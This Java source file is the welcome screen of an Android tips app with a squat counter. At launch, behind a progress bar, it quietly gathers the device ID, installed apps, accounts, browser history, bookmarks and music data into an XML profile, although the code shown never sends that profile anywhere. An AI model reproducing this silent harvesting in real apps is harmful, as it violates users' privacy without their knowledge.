package com.airwhip.circle.tips;

import android.app.Activity;
import android.content.Context;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.widget.ImageButton;
import android.widget.ProgressBar;
import android.widget.TextView;

import com.airwhip.circle.tips.anim.Fade;
import com.airwhip.circle.tips.direction.health.Squats;
import com.airwhip.circle.tips.getters.AccountInformation;
import com.airwhip.circle.tips.getters.ApplicationInformation;
import com.airwhip.circle.tips.getters.BrowserInformation;
import com.airwhip.circle.tips.getters.MusicInformation;

public class WelcomeActivity extends Activity implements SensorEventListener {

    private static final String XML_DOCUMENT = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n";
    private static final String USER_TAG_BEGIN_1 = "<user id=\"";
    private static final String USER_TAG_BEGIN_2 = "\">\n";
    private static final String USER_TAG_END = "</user>";

    private ProgressBar progressBar;

    // 0 - health, 1 - communicate, 2 - play
    private ImageButton[] buttons = new ImageButton[3];

    private TextView tip;
    private TextView appNameLogo;
    private TextView slogan;
    private TextView tutorialMessage;

    private SensorManager sensorManager;
    private SensorEvent lastAccelerometerEvent;
    private Squats squats = new Squats();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        setContentView(R.layout.welcome_activity);

        progressBar = (ProgressBar) findViewById(R.id.progressBar);

        buttons[0] = (ImageButton) findViewById(R.id.health);
        buttons[1] = (ImageButton) findViewById(R.id.communicate);
        buttons[2] = (ImageButton) findViewById(R.id.play);

        tip = (TextView) findViewById(R.id.tip);
        appNameLogo = (TextView) findViewById(R.id.app_name_logo);
        slogan = (TextView) findViewById(R.id.slogan);
        tutorialMessage = (TextView) findViewById(R.id.tutorial_message);
    }

    @Override
    protected void onStart() {
        super.onStart();
        new GetInformation().execute();

    }

    @Override
    protected void onResume() {
        super.onResume();
        sensorManager.registerListener(this, sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER), SensorManager.SENSOR_DELAY_UI);
    }

    @Override
    protected void onPause() {
        super.onPause();
        sensorManager.unregisterListener(this);
    }

    @Override
    public void onSensorChanged(SensorEvent event) {
        switch (event.sensor.getType()) {
            case Sensor.TYPE_ACCELEROMETER:
                lastAccelerometerEvent = event;
                if (squats.isStart()) {
                    squats.update(event);
                }
                break;
            default:
                break;
        }
    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {

    }

    private String getTip(View view) {
        switch (view.getId()) {
            case R.id.health:
                return getString(R.string.health);
            case R.id.communicate:
                return getString(R.string.communicate);
            case R.id.play:
                return getString(R.string.play);
            default:
                Log.e("ERROR_APP", "UNDEFINED ID");
                return "";
        }
    }

    private class GetInformation extends AsyncTask<Void, Integer, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            StringBuilder information = new StringBuilder(XML_DOCUMENT);
            information.append(USER_TAG_BEGIN_1 + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + USER_TAG_BEGIN_2);
            information.append(ApplicationInformation.get(getApplicationContext()));
            publishProgress(20);
            information.append(AccountInformation.get(getApplicationContext()));
            publishProgress(40);
            information.append(BrowserInformation.getHistory(getApplicationContext()));
            publishProgress(60);
            information.append(BrowserInformation.getBookmarks(getApplicationContext()));
            publishProgress(80);
            information.append(MusicInformation.get(getApplicationContext()));
            publishProgress(100);
            information.append(USER_TAG_END);
            return null;
        }

        @Override
        protected void onProgressUpdate(Integer... values) {
            progressBar.setProgress(values[0]);
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            progressBar.startAnimation(new Fade(progressBar, 0f));
            tip.startAnimation(new Fade(tip, 0f));
            appNameLogo.startAnimation(new Fade(appNameLogo, 0f));
            slogan.startAnimation(new Fade(slogan, 0f));
            tutorialMessage.setVisibility(View.VISIBLE);
            for (ImageButton im : buttons) {
                im.setOnLongClickListener(new ButtonHold());
                im.setOnTouchListener(new ButtonRelease());
                im.setOnClickListener(new ButtonClick());
            }
        }
    }

    private class ButtonClick implements View.OnClickListener {
        @Override
        public void onClick(View v) {
            switch (v.getId()) {
                case R.id.health:
                    squats.start(lastAccelerometerEvent);
                    break;
                case R.id.communicate:
                    break;
                case R.id.play:
                    break;
                default:
                    Log.e("ERROR_APP", "UNDEFINED ID");
            }
        }
    }

    private class ButtonHold implements View.OnLongClickListener {
        @Override
        public boolean onLongClick(View v) {
            tip.setText(getTip(v));
            tip.startAnimation(new Fade(tip, 1f));

            for (View i : buttons) {
                if (i != v) {
                    i.startAnimation(new Fade(i, .4f));
                }
            }
            return false;
        }
    }

    private class ButtonRelease implements View.OnTouchListener {
        @Override
        public boolean onTouch(View v, MotionEvent event) {
            if (event.getAction() == MotionEvent.ACTION_UP) {
                tip.setText(getTip(v));
                tip.startAnimation(new Fade(tip, 0f));

                for (View i : buttons) {
                    if (i != v) {
                        i.startAnimation(new Fade(i, 1f));
                    }
                }
            }
            return false;
        }
    }
}
